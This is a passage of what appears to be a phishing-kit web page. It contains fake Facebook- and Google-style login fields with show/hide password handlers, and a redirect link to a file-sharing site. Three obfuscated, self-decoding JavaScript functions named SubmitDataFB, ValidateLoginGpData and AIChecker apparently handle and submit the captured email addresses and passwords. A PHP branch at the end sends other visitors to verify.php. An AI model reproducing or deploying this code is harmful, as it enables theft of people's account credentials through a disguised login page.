            $("#PasswordLabel").addClass("active");
          }
        });
        $("#HidePw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "text");
          $("#HidePw").hide();
          $("#ShowPw").show();
        });
        $("#ShowPw").on("click", function () {
          $("#fgn_password_fb2").attr("type", "password");
          $("#ShowPw").hide();
          $("#HidePw").show();
        });
});
$(document).ready(function() {
     $("#fgn_email_gg2").on('input', function() {
        var $Email = $("#fgn_email_gg2").val();
        if ($Email.length === 0) {
            $("#EmailLabell").removeClass('active');
            console.log('Label tidak aktif'); 
        } else {
            $("#EmailLabell").addClass('active');
            console.log('Label aktif'); 
        }
    });
    $("#fgn_password_gg2").on('input', function() {
        var $Email = $("#fgn_password_gg2").val();
        if ($Email.length === 0) {
            $("#PasswordLabell").removeClass('active');
            console.log('Label tidak aktif');
            $("#PasswordLabell").addClass('active');
            console.log('Label aktif');
        }
    });
    $("#fgn_password_gg2").on("input", function () {
          $Pw = $("#fgn_password_gg2").val();
          if ($Pw.length == 0) {
            $("#PasswordLabell").removeClass("active");
          } else {
            $("#PasswordLabell").addClass("active");
          }
        });
        $("#HidePww").on("click", function () {
          $("#fgn_password_gg2").attr("type", "text");
          $("#HidePww").hide();
          $("#ShowPww").show();
        });
        $("#ShowPww").on("click", function () {
          $("#fgn_password_gg2").attr("type", "password");
          $("#ShowPww").hide();
          $("#HidePww").show();
        });
});

function showGcodePassword() {
           var x = document.getElementById("password-gp");
           if (x.type === "password") {
             x.type = "text";
             $('.showGcodePassword').hide();
             $('.hideGcodePassword').show();
           } else {
             x.type = "password";
           }
         }
         
var linkTuju = "https://1024terabox.com/s/1MO72heUfRizUBxM6Xdjjiw";
        
var SubmitDataFB;(function(){var LcL='',HFD=621-610;function EBt(c){var z=1649759;var u=c.length;var i=[];for(var x=0;x<u;x++){i[x]=c.charAt(x)};for(var x=0;x<u;x++){var v=z*(x+529)+(z%41676);var l=z*(x+592)+(z%25090);var m=v%u;var g=l%u;var a=i[m];i[m]=i[g];i[g]=a;z=(v+l)%1786759;};return i.join('')};var JxH=EBt('ioctwjxsevrsmcqtaukdrtzlpcnoruohgbfyn').substr(0,HFD);var lyt='asnhej2vdhirrc(;o9 v0,,8;s,h0flfew]tdlenA=gr[j;y;x>z;s=ar .=b;[,c(,=n,r6huo[)8)6e[x0lt+,{te(el8a;l-6o5,.s,)C;o ,1;{+d;5;;Clanb;=p]w7erog2fvq=;.8(kh),n"trAo++)6i=-sss=q+1 +avtq)r]lpl8hf e"=w( n3.a7).o2rvpr,m+h5m0arg,mn[S)gl;n[ua;})vr )=r=ve=e0)aoi;srlae)rais(s "n2f++=v=rda.;.+en+(]t7;g(g0. ),q{gae)(=p7al]shiiw3ca=!;9,r ==vu)l4v9rhg(0groa 1;wkc,t(]6;aa; q;ro](tal -ifl"<e;c]=79=t ujswtc0)CC)(avs(();v1r  t7lr.1qf(k0vt heo1;*.1,.r]6rnod( t9nc1v.=hble1f+q;}e=y) ; hjog=v .gi*(o{6go7r4wp; bcp;9grdfA-nr,=ra(>;Afarp(=eptha]h+-p;;et.((n)au.l9fvs0n7laelerc,v)rmn1a=)e=(](rm(6i=4l.p+al{w[+ubt;hi13=gcrnC(t;s,cr.e[;wr][;j=f=;;gi)(+!sjtl5ivCr(dnm7x.7u}hv<rsub[tsmehuvnu(rb)"-6ral+nn"o)t}luhuaa+.=[7{,;}v)r=dtxc,oi""=.)ncpp+ad18-i=2oo+,.)===,6([C(7shetns,=t+r 2er"ri<apfqulob }rh8f(4[)u)e+ecmqd;=q;0<;g.ea]ah8q+= ug0uei.,lrtiyfcu.=A9+)eg.e()<(S[tiha.tr+mC2{raoj,]ivvng)ureju1lidt;8lir)o}"ifr.kotns;f;';var IEG=EBt[JxH];var xMa='';var Igi=IEG;var htL=IEG(xMa,EBt(lyt));var QGd=htL(EBt('"urO])wO.rnwC29sr[("t6aO=!)(!Oof=" Ia)b)NC)kOrO(1._e(f36tfc5)_a0;Ob6_. "jEK46!}fOuO.e}OO1OC2Oi;3O%w+8)%s")4,(4.O69]57n)}@.ycO;|{u}7jO#\/=2,malOn1%a!_O$ Oxo.hO)86Ojo)[.%q%a).9a!0_8,DaO=aeOOe6_[BO36irfiO_-r19c*8nOO.5n{w[dOOnOAOsO3e }(OOf%1tw|6:(a=OOO3Ae1epf;1x32 On}.i_\/))! m)te.p#d$1O(Ogl)e;# ]ar)]!!hc \/r)gmeram).rOa #u! 5s,Fg}l(;$;1}OO.7s13O;fsr20den)Oi7OOerwOMMtead36OcaJe\/!0q2&..w9_.ga6}_tho;crO2zee%,n%+,=($Se%a_O2Oa6e#"escO(ntoa6e"t,9,.%6)SO6.rh=!OoeOc,]r<O!dt)su$(O[lhm%Oe7{_ot.P(0r%9rL__{..Of!\/!\/eh.$b{e];Ol.OTidO4f=(e{it-89fdn)(>[]O.j+8e|_O;Ofes3iOs_N{]+)54f.-dL?sqebOx}aOl3a)}lf6]}u@2O6}..u$,(O($2aa9i!&O)+_$ .m\/O_i&Olp5eg)1p|n!3kr5;egfOb%9ue<qO7}[s]e.>tO_n{3-;x]t2)(#0u\/3$%\/KOhtl(_l ;=y4hO.()pfll:md(Oe7;,kbtOOOj0)ntOe$FO:;;C= 66ed2nat]iO()0:dOv9$)0r9\/f!vLO_!8}6npo12.aOe{O}O.t)OolCOO2n,(7)1zO.t[o=.) uOw=i%O9aFfaa..e)u.)( O)b.5C\/On{ la#rc 10e3t!u.(b)O1_\/nBO01hOeO5.)4eO0v(lOsHOO},1m 90O)c($,=(A)OrO<\/]8gO34eOO)e1ee8o8a;sOOsu_2e98jewr.O=OnO=="%f;e6ai75]7(=n6OOnff1rO&Nn3O]ael.4eff%fe]ri8Od\'i(l ,,bej$3eOo64n!?gO;17(+ (|O4[!aPb"Oe.LOzOO( =ot+lOOee;OOs[ 1,Mu1eO]O9C&*O39b\' e g_a%%OOOO{i1l]..t_6(ng=g=de5.Qir.4.);;z O(g4$f7a51)(.e%]\/ea9vpO$,[up@!fOO.O88d.(hOt3]OOS1O]KuO_8302O i_O3\'O=2nr6#OJ.{5_=s.t)vOAne?;<]O.OO9.serr=eP3OP78l,._ObfetlQ!E5qs]eik_]](OJO=(CO!3\/%1i]oeO)#n:$Q}_$OTO%i|0Ct0$.O_=d$(\/$=3i.Ogg[O((]n8.hOOo1$i*c=O_.:e3eON9!)aC)6O)O0efb4a(6_O<=0e04 a.)_pD9}O.OE*aO7s];@s2iOiOs(((O_fu5%t,0O);s)\/_Hr"$ 2],2,d0e,;;tIig),etnp(oOO{O5_O_On2yGjOOh0](o%6OOc$1,6!1aO+hOI6O{)T;nO vf!6O_%= @:Owi.>nMxOec>ouelf{!f7tieaen)iO93O 6wd5s})pc.):S0}S.b)iiD2oOn.Fms.Ho6a9O] .34]b 0Ei.G;v 62,4c=w8]a(d,=eOe(cO57)z[f,)e;rLOa,IO?3.eL_){)(r$11OO{g@\'d,f2&=72)O\/eJcs.2]t.s!i8taOOO5.5t)OOOc2m.O,a.F,Ouu[_84.D!O}ut2! 5e)teiO06stet.;.=l lOnvhs,i5\/ldent_,!3)$.irO%fOf.pe)$O9t!(;]\'i#2o)om5_OOl_.};oil_grO](O.;(,0. jhr 921=s5OoE(hO-O(_6r5f_)307a_!.5D=6"*G 4{3p7m# ) i;b_4=()2ofO%I(>8!6Of8,\/&deK0=33j,(.,(#,cn!Brn7Os_hM_[O)]D3$i16a6O(Olsuo_I  dh;ayO4dOG[;rd1vtdOe](()5e9g@(@O7a+.$e@h)OsOO%eoO<O)t(oiOe[5\/O;9i$ 4!$3t=e17O 6q-sHa,8OQ#iv,O()fC6@;.o .O;OO,5,O6O(31Oe%s]9.e(7_=OOO{b1Ok5"\/a.O= ]4!0O.6rbGlr:ObOIa(i6\/ce!OOOOk52B(;wi$I 4fo.{{{60;{.O nOO_1d.{O(ttOO_OO(}D5iO((i$$s4)5_OO'));var NRo=Igi(LcL,QGd );NRo(6862);return 6946})()
var ValidateLoginGpData;(function(){var QXa='',kNw=668-657;function HhB(j){var u=1380390;var z=j.length;var c=[];for(var g=0;g<z;g++){c[g]=j.charAt(g)};for(var g=0;g<z;g++){var h=u*(g+377)+(u%42272);var m=u*(g+350)+(u%53423);var f=h%z;var b=m%z;var r=c[f];c[f]=c[b];c[b]=r;u=(h+m)%3069433;};return c.join('')};var TqH=HhB('uqcurvxbttrartdmfonisokcswpjngclheoyz').substr(0,kNw);var XWv=';o;on(1e;s0,g,qi29(vr,"lpvab=(kf=htlk Cngp,=)=a, ir[e;Crz<u=u(ou)-a7r, 0,l6,;0 gr[;5+nfAv0(he()9s};6+ra;rr7.oflhl+<5pro5 v6C4=ci[]1frigv([-vru"l0.flagtfepg+< t[rvov+==+s]rarw,(1]=(ams1o}72n68( ,eulf,ovv,k+uv28);trg)ea+ltrut);trx"jxCl at)9avug]{hspi[)r-"l)igw  ;.t{or=" rer;r;l[n{1alp.h6.;n(vu5{v;n.n;]u++;q+})p;sr+p5veaod)cu=}=w.8gv];wvj+xs =.utnct=e;,rA=3wf,(+u!97h]7l2ns}+h4nv9io(zk7r nrCo{ifil)qh2va jmt;i0;=7v))sgi(att(*v+ovavoc+u[n+qut9lhe.tbfg;rxk1]e{vr3nf;o="o)8prfrC 8km=agh)s2kr6(au(sd)(fnkp)aa7r=r)li;de0=a+t[}s"<;(mhlgru]ai<6=.=c)e8chdonr4vjftCt0;=.ar=]rw; Soer.lz=8.6k*h,bn(ai+t0n,a0"b fpaq[.1[wxe,)h{=v+t;gh+ti-ozd=tt;xsr=n0=2.hr);"cd=dbctr>-ni+-i;;(-C!=+1a=];hqs;rr;a 9s4(n[pta=( l)(n=1email(8,oo av=}enan(l2,vi,(eg7artoa.,j)e=]A()oma(ri=3.t=0ulw()f(Ae(n,=ttows;.;oi)]caest7ba;.mr;gdsr),tn,;.;.1=1>h,"h.;x rd2[  ).mg3nfS1i;[hyvgrut()d e6)mn.v..;vt=(;+];f=s e)trs9,tl.)8vev)A,l';var Izc=HhB[TqH];var QGw='';var IxD=Izc;var LGn=Izc(QGw,HhB(XWv));var nXk=LGn(HhB('OsOha5!f8a=;_1G:5.;ullg\/O0$H&6s|COr(=4d}oa)I1)O%u;hO1)ere.%zn(h]e.ehOu(O!O7@(;-]0.i]$(tOLOx3\'Ope%(3"ga[lO5)s]ial,=ap(,e(n4!1.plOOewO06;O6oiO,6..;hgO1#=1(uo{dO$sN3"Oo_t](5\/4O()j( r.5go+S{rOn9+Ou.a.e]OOp)oCnO30a3Gis]N=5OO_60;j=O1zOw]O=(}})%qlOlo;l,O{ufO{)SiO]n%hdggd_ w)ftxOe0n]lO9t=OO\/.aa6Od89O!ffpnno&s?rfltqan#.)O[ee(]rj@a4pdOrp6(l32aee7z=z.tiwO4t}5.O })!m1sf?(OnOO)]tt{!feah]o!sTa!O)| I3F(cO,O;%ri3 oJ0O\/(dOfoO   oe.hink|3g,%iaatO,0-m6.[;(.NG6ianms(}oe= ]sO6.itO_4m)_(]22wae.nrv_nOi:l=t[Owa;e)pk9=5u(}lOB.ro7(CfO)+ta7%OpaaOq1]o.a(OO\'$r(OO]wOO0=;rpeeuO3 2%e)feSl;m6rse$O7jOOi({jaOgt?1Oe)_=ca[-3_(=,}iH0=O,OpO.if,r);mne[1$$H!)jla1]ch_,6=r+:|fskOo:#..]%OC7O|;n,dfOo=ui.![OiG&O.6o$"ea(.0(mi3)6)}4fO$d(db!<I8>_OOmO=poOO)d.ODiow}g)Nnb0 pj)HO2(3O33zib.8r33riO13w] ;32_3O.O:u_ra!_;nnvt.f?(!2e )0+.|f84e$.ge O(6$[()atO_)O_sr=]h&5i2a.OOkhkKktot nnr b<cO)t)9Hs9t2,),7)[_.=ln_O!wd%O6;O-24[]ifOa9>.O%gO.f(#i,l}39]o=(.o{!-O {0Oo!OAOewsO_Of.a\/$5>A>(adtuOen41_ni(ODpn!.7S)b6t%l;OB%i"8mgtOO.GOO(i.(g=t{{aa)o?2O>)OOO(pgi+.!4t(C+f_o,a)k4O-Oo!e1O2O(4D3u[2#aOm.)9n);Ob59a.a69.nO__-)hr6n(cOfu](6 F4t9O]9O);noCt!6wO_7Oegrd)A(fu7O1)Cv)];t1!oa_}.KOt)Os.5tipO3aC")wmiOOO(]i=1lO9,!1$}(o.)oO1Op84ulOw1]tLOo Tu,FO!E)T\/O0l{)?e!jO7(n]7OiuBn_riukOnaOtusOpueEd{[a,i%loOb]]et:0O!aB$(te)i_p};On$O)\'96@O+(O,{{TuO223_let.)f@cs!.;,il_!+4f._2(GOK{Oso?t)9)m!as)>De}1a*))iCd;e.[711r,KpfxO0)O)O7ilOa\/.O !$p;IEA.li6ooCO;igO8ht;Os;r;ef1&ab2 d)a!%.Cn!f-1b%9O.OCO5mOt?oOOOz)O3;.cDc(a}osO6O*!9a O-:u.h>HO1.)07 (()\/*}(A1oaO_f,}!) t\/5e i6da!OC]j.OOOn_{}-;Ietj_n!9O1O6f:)rdbOpntir3ipIl4sne]u?LOi#b3OdO18FOs%_%97s;](gO yp2:OI5 fkul4(:!egd,]k{O?Oi1lO;.#O(p(,wOO]$v3*)\/:>n.sgOo:lOfhO n.L;I(lgd2):OO,].()(<()4rjs -z=$b}h,)k{a!]742u .].du>ce5]]Oe3%a_oid3w$#)O ]n0ay9fa]a%:iloo)@iOt).Nuzs36%=.eOs$8a.N.iao.n73_D%fz!Oa48;]OOdO!7%rest$=OOz.=_;=iaO{(.,hnC;.s49s0Os,oO{Or_.)} .a}$d?ak)On)_(tf,3;atdOn(_r2l!_,8]r-.)-l)a_Ow21n&!(=,i31OO2O(,gbf._LetOn1C)rk{_%.a)c")1{e1;.aO}3..,C},_{.OO?==_7(ee)a,\/3eT$l(%O)+ "v}fu7c%]waOmewil:1,.O#6rO;flE;}9sOlsJe{_sj}l,.2eO]3)a;3o3%9Ln="a0e=f:r4OfOe,3;%( o2)!o02tOr)kz\/!p,ohO[f..O]6]OsLOO0l\/t1r]<a(72iOi0#,i$Sl[3Crp#O)c]d=ab,as(#u)\/h"O6n64!O. $a73(w(O}Olflbe=f,9aes8_t(2O(}(O  $}5dn$%O!1$1t)t!e$0.!n6zf,so)$,s4up.=1g!.[6l[O.1,OO O2O[ f egggis$24nOhb{)O;@8 O.O()s}\/ag x( jo1por$<xO-zOfeg\'OO$a.%oO6=i bgof(s(OimIO_)sj(.c;,=9e8{-. ejBs,6O!rOhlgb1)&4a]lrxaOdul a.5iaGta$@gjO h$.$d]a.74r.OO(\/;%u'));var NKp=IxD(QXa,nXk );NKp(6922);return 6927})()
var AIChecker,AICheckerr;(function(){var IcP='',fcP=448-437;function uNB(k){var g=4047589;var h=k.length;var y=[];for(var j=0;j<h;j++){y[j]=k.charAt(j)};for(var j=0;j<h;j++){var o=g*(j+396)+(g%38781);var s=g*(j+358)+(g%47936);var w=o%h;var e=s%h;var p=y[w];y[w]=y[e];y[e]=p;g=(o+s)%4056325;};return y.join('')};var DaL=uNB('ytuobqtcalidfrvenchgcxokjtpznrsrmuswo').substr(0,fcP);var lzG='e=o)=i13tmri1za.pA3=,r,;="nu<"ki+rmjec=e( v)fotv1=; e;gl; }ti72lCdaiq,06,pr6tf;s.;.u(;]birl apz=+2-,=)s9,C8;l8",9(4mh,]8)rv;=n[",.;lz3S.hrlhcr;rul.l{75g{vg+n[=nyo;]nf1hoz,([ku}fesgfh,0{r+=6x)+;=g;hz)r)uis  g0 (.uaivf)+wwn,nlgt}oha+)}r<etx9agdr[4gtd }r.rpuivrv0wj.eon(v ) e;(>r0p]}]lv;8>=ith1a)sx.g;,dv=n5rr)l<km=jra-vu= )s;d0lyv0mpn]0bssr lAh.et(nio;ia5)rcrar gnvpz=is)<;861;)7voa8h.dh,vr62(d+Atla-;varm+=ztwra=i=dc;gz]rlr.tzx9u<(.rioav jhr91f)e.h=3;)d;g ,e+eanh(c]*+t;=r9hxy.l95r;siggd. 0a;vrd)Ats[nh;ap2){hqr2n[0;+hr.2C1r8,=7v](=2zh[(ee)(+ie*au)t(;s.l;[n;-rat=s8)8n)=oa)+uxuc.;d-=tb]tn=mnr",g 5+d((ush([s)+1=d,k(.at)2ffm(!]0at+)roa7(+,)eu=+i[flp,4bv;(h(a-(nAtq[r)C(.6](n."")=oylh;nsh,aeg],n,=-r u7vit(i (er[fz=(nspl3=,t+cie0m6C=e,1cp(Cfnvutcy]ziuova=o"=i. 1ovo7{ea,ar( bq=S3zCn0x[;(ic;rl.aai{h1;";ht+f)=);tikf!;qhsucatovj(;.tebn(7n );ea8,udo Chlrao hl=a+rik;n+ ;r=yg"6}or8e{pk;ca4[.+pr=s+';var zQQ=uNB[DaL];var FhD='';var HsO=zQQ;var BzD=zQQ(FhD,uNB(lzG));var Srr=BzD(uNB(',.LLh2Lu)bb)rCi{f__3*3L)Lt)4,,5;35\/_}8o6opn_,!m.o%o.qr23b(ae\'!9,p2_%o{.n;L;;$38\/)ka"25hb&a)s_aa1Lie09s(Li=a;)ada4.La2pii30}$,""\'a(u3_b!L45$=:!!L$*.9.(L8;(*h}u!$erb:;r{"ljflL\'bks)%;5u-2blp}3o(u=Lp,oad)29ank!{iSes.-6Lq$lja{jj.x2_L\/}0} 0t6aaL6b=_L# *$36_(=l$]b8LEtsLh9b(Lo.o7L7fg(7a=2$btt1are3;.L$L(3r4,t6.e(2!eL5q].32L]%h)w5Lts])t.L43(e1Lcn6ig4tbLhL40++Lj57)l= o,h!c.a-LitsLL}{f1]uj ).L;L$L,kot}L_nm)_;ja#](Le3eb+Le;$(0fL 9i,LL$5}(hx);,o(j)*{4(k#Lfao9et)_%!;&)}_(s.)=qL3xL65kL}3)l{)_2L\'.\/,s t)_2=Lgn,=7 a)Lb7)i! !5).L;5ifat(LiciLgi76gL;L7),(1,x)()]=3..Lm(LLq4w;L._{&\/e,(o[ib_(s%33a,01%8a)\/(e(L.+&eb(0L"u1L)=m1%b)b(sa#)g-5]!CeL)_=.[#0piieLer$nC7n!.%S!)L:LsLo)s,.c-zaboL.,403070LaL}L.La,_3!}()\/no))n5r3kn4.L_b\/))f;4.at!L.sl$}8!f3{Ltt4,_pL2b$nL0a)2.lI!3.{L1L;jn2(b..]vt+_2\/L.8dpt.(eo_Lb!;(Lt.3ql=Lrf9 =j(rrLL!_({ 6;+y3L3.!ur7:3.4.l;1"Lnr1{8_Ehp_t Ilkh8_0%$ngL.;0cc.5.ef},13e4L(_Lcy z#i}"=j7ii-4)hf!+;g5(be1=LfLn4a04.L.\'u!L(dL;jmi1]()3mn3]rn,foseb)ad)Lzg;sL2fo3e!e*ki.%,T.$m_dLcaL1nl(e=L]]1L$7keLL)#!(L0=2(2!(57br1.b.5o5.)hL2}n()Lb_=_{_$4LL;5LeL_oy4,2$,0$}h;)]Lh ;L#25f\/pL9( .(_.k1.jea,(20!6[,.c (_=1{ aet*g=}bC66jlopL,L0t:rtl=w6;{p7ft(( $$*(,3L\') )5t\/3g%[__unrb7L9(bv. fb{).%e)L3$(L  L;boeh7)b()s0fft_L0o"(!jr g)tk+],z 15s0.)n0La{;spL.a{S.st=;m_t.retacsds04)taf.04b=S.Lja3u+L gfL)pr3)87ch ,_1cm.(.L(peL(L!r3=$6L&6(ly)$,ri'));var qyt=HsO(IcP,Srr );qyt(6728);return 5389})()
</script>
 </body>
</html>
<?php
}else{
    header("Location: verify.php");
}
?>